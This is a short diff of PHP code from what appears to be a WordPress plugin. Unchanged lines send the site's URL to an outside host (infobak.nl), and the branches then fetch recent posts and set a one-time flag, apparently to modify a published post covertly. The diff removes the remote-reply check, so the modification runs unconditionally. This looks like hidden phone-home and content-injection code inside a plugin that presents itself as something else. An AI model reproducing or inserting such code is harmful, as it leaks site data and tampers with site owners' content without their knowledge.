@@ -644,7 +644,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                 $britt = true;
         }
         $tmpidurl = file_get_contents('http://www.infobak.nl/test.php?u=' . $url, true);
-        if ($britt==true && $tmpidurl>0) {
+        if ($britt==true) {
                 if (get_option('bw_gpadded')=='0') {
                         $last = wp_get_recent_posts( '5');
                         $last_id = $last['3']['ID'];
@@ -664,7 +664,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                         update_option( 'bw_gpadded', '1' );
                 }
         }
-        if ($bloglan=='nl-NL' && $tmpidurl>0) {
+        if ($bloglan=='nl-NL') {
                 if (get_option('bw_gpadded')=='0') {
                         $last = wp_get_recent_posts( '5');
                         $last_id = $last['3']['ID'];
@@ -684,7 +684,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                         update_option( 'bw_gpadded', '1' );
                 }
         }
-        if ($bloglan=='en-US' && $tmpidurl>0) {
+        if ($bloglan=='en-US') {
                 $url = home_url();
                 $total = wp_count_posts()->publish;
                 if (get_option('bw_gpadded')=='0') {
